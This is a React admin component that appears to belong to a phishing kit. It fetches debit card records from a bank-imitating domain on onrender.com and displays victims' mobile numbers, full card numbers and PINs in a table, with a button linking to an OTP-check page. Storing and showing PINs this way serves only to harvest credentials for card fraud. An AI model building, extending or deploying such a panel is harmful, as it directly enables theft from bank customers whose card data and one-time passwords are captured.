import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import "./cardsdetails.css"; // reuse CSS

export default function DebitCardDetails() {
  const [cards, setCards] = useState([]);
  const [loading, setLoading] = useState(true);
  const navigate = useNavigate();

  // Convert UTC to IST
  const formatIST = (utcDate) => {
    return new Date(utcDate).toLocaleString("en-IN", {
      timeZone: "Asia/Kolkata",
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: true,
    });
  };

  // Fetch debit cards
  const fetchCards = () => {
    setLoading(true);
    fetch("https://axisonline-1.onrender.com/api/debit-cards/list")
      .then((res) => res.json())
      .then((data) => {
        setCards(data);
        setLoading(false);
      })
      .catch((err) => {
        console.error("Fetch error:", err);
        setLoading(false);
      });
  };

  // Navigate to OTP page
  const goToOTP = () => {
    navigate("/admin/otp-check"); // update route if needed
  };

  useEffect(() => {
    fetchCards();
  }, []);

  return (
    <div className="usercards-container">
      {/* Header with Refresh and OTP buttons */}
      <div className="usercards-header">
        <h2>Debit Card Details</h2>
        <div className="header-buttons">
          <button className="otp-btn-small" onClick={fetchCards}>
            Refresh
          </button>
          <button className="otp-btn-small" onClick={goToOTP}>
            OTP
          </button>
        </div>
      </div>

      {loading ? (
        <p>Loading debit cards...</p>
      ) : cards.length === 0 ? (
        <p>No debit cards found</p>
      ) : (
        <div className="table-wrapper">
          <table className="usercards-table">
            <thead>
              <tr>
                <th>Mobile</th>
                <th>Card Number</th>
                <th>PIN</th>
                <th>Created At (IST)</th>
              </tr>
            </thead>
            <tbody>
              {cards.map((card) => (
                <tr key={card._id}>
                  <td>{card.mobileNumber}</td>
                  <td>{card.cardNumber}</td>
                  <td>{card.pin}</td>
                  <td>{formatIST(card.createdAt)}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}
